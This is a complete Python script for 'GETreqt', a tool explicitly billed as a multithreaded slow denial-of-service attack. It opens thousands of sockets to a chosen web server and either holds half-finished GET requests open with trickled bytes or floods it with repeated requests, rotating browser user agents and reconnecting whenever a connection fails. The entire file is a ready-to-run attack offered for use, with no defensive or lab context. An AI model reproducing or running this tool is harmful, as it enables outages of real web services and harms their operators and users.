import socket; import time
import threading; import random
import argparse; import requests
from termcolor import colored
import colorama; import re

colorama.init()

currentVersionNumber = "v3.1.1"
VERSION_CHECK_URL = "https://raw.githubusercontent.com/SHUR1K-N/GETreqt-Multithreaded-Slow-DoS-Attack/master/versionfile.txt"
BANNER1 = colored('''
   ▄████ ▓█████▄▄▄█████▓ ██▀███  ▓█████   █████  ▄▄▄█████▓
  ██▒ ▀█▒▓█   ▀▓  ██▒ ▓▒▓██ ▒ ██▒▓█   ▀ ▒██▓  ██▒▓  ██▒ ▓▒
 ▒██░▄▄▄░▒███  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒███   ▒██▒  ██░▒ ▓██░ ▒░
 ░▓█  ██▓▒▓█  ▄░ ▓██▓ ░ ▒██▀▀█▄  ▒▓█  ▄ ░██  █▀ ░░ ▓██▓ ░
 ░▒▓███▀▒░▒████▒ ▒██▒ ░ ░██▓ ▒██▒░▒████▒░▒███▒█▄   ▒██▒ ░
  ░▒   ▒ ░░ ▒░ ░ ▒ ░░   ░ ▒▓ ░▒▓░░░ ▒░ ░░░ ▒▒░ ▒   ▒ ░░
   ░   ░  ░ ░  ░   ░      ░▒ ░ ▒░ ░ ░  ░ ░ ▒░  ░     ░
 ░ ░   ░    ░    ░        ░░   ░    ░      ░   ░   ░''', 'blue')
BANNER2 = colored('''    ------------------------------------------------''', 'blue')
BANNER3 = colored('''    || GETreqt: The Multithreaded Slow DoS Attack ||''', 'red')
BANNER4 = colored('''    ------------------------------------------------''', 'blue')


def printBanner():
    print(BANNER1), print(BANNER2), print(BANNER3), print(BANNER4)


def versionCheck():
    global currentVersionNumber

    print("\nChecking for GETreqt updates...", end="")

    crawlVersionFile = requests.get(VERSION_CHECK_URL)
    crawlVersionFile = str(crawlVersionFile.content)
    crawlVersionFile = re.findall(r"([0-9]+)", crawlVersionFile)
    latestVersionNumber = int(''.join(crawlVersionFile))

    currentVersionNumber = re.findall(r"([0-9]+)", currentVersionNumber)
    currentVersionNumber = int(''.join(currentVersionNumber))

    if currentVersionNumber >= latestVersionNumber:
        print(colored(" You are using the latest version!\n", "green"))
    elif currentVersionNumber < latestVersionNumber:
        print(colored(" You are using an older version of GETreqt.", "red"))
        print(colored("\nGet the latest version at https://github.com/SHUR1K-N/GETreqt-Multithreaded-Slow-DoS-Attack", "yellow"))
        print(colored("Every new version comes with fixes, improvements, new features, etc..", "yellow"))
        print(colored("Please do not open an Issue if you see this message and have not yet tried the latest version.\n", "yellow"))


randomUserAgent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.57",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
]
successfulSends = 0


def constructRequest():
    requestHeaders = ["GET / HTTP/2.0",
                      f"Host: {target}",
                      # "Connection: keep-alive", # Not required with HTTP v1.1 & HTTP 2
                      f"User-Agent: {random.choice(randomUserAgent)}\r\n",
                      ]
    if arguments.wait:
        pass
    elif arguments.end:
        requestHeaders = requestHeaders[:3] + [f"User-Agent: {random.choice(randomUserAgent)}\r\n\r\n"]
    GETrequest = "\r\n".join(requestHeaders).encode("utf-8")
    return(GETrequest)


def deployRequests(target, port, length, currentSocket, GETrequest):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # sock.settimeout(5)
    try:
        sock.connect((target, port))
        sock.send(GETrequest)
    except:
        try:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
            deployRequests(target, port, length, currentSocket, GETrequest)
        except:
            deployRequests(target, port, length, currentSocket, GETrequest)

    if arguments.end:
        global successfulSends
        for i in range(1, length + 1):
            try:
                sock.send(GETrequest)
                successfulSends += 1
                print(f"Successful send {successfulSends} from socket {currentSocket}\n", end="")
            except:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                    sock.close()
                    deployRequests(target, port, length, currentSocket, GETrequest)
                except:
                    deployRequests(target, port, length, currentSocket, GETrequest)
            randomDelay = random.random() * 5
            time.sleep(randomDelay)
        try:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
        except:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
        finally:
                deployRequests(target, port, length, currentSocket, GETrequest)

    else:
        for i in range(1, length + 1):
            try:
                # sock.send(bytes(str(f"{random.randint(1, 5000)}\r\n"), encoding="utf-8"))
                sock.send(b" ")
                print(f"Sent \"don't you die on me\" packet {i} / {length} to socket {currentSocket}\n", end="")
            except:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                    sock.close()
                    deployRequests(target, port, length, currentSocket, GETrequest)
                except:
                    deployRequests(target, port, length, currentSocket, GETrequest)
            randomDelay = random.random() * 5
            time.sleep(randomDelay)
        try:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
        except:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
        finally:
                deployRequests(target, port, length, currentSocket, GETrequest)


def attackThreads(target, port, length, sockets, GETrequest):
    threadingPool = []
    print()
    for currentSocket in range(sockets):
        threadingPool.append(threading.Thread(target=deployRequests, args=[target, port, length, currentSocket, GETrequest]))
        print(f"Creating {currentSocket} sockets to attack {target} via port {port}\n", end="")
        threadingPool[currentSocket].start()
    for thread in threadingPool:
        thread.join()
    print("You may now exit this window.")


if __name__ == "__main__":

    printBanner()

    versionCheck()

    cli = argparse.ArgumentParser()
    cliExclusive = cli.add_mutually_exclusive_group()

    cli.add_argument("-x", "--target", required=True, help="Target web server address (IP addess or URL)")
    cli.add_argument("-p", "--port", required=True, type=int, help="Target web server port (eg: 80)")
    cli.add_argument("-l", "--length", required=True, type=int, help="Total packet length (eg: 1000)")
    cli.add_argument("-t", "--threads", required=True, type=int, help="Threads (sockets) to attack with (eg: 6000)")
    cliExclusive.add_argument("-w", "--wait", help="Do not terminate requests (elegant slow DoS)", action="store_true")
    cliExclusive.add_argument("-e", "--end", help="Terminate all requests correctly (blatant GET spam)", action="store_true")

    arguments = cli.parse_args()

    target = arguments.target
    port = arguments.port
    length = arguments.length
    sockets = arguments.threads

    GETrequest = constructRequest()

    attackThreads(target, port, length, sockets, GETrequest)
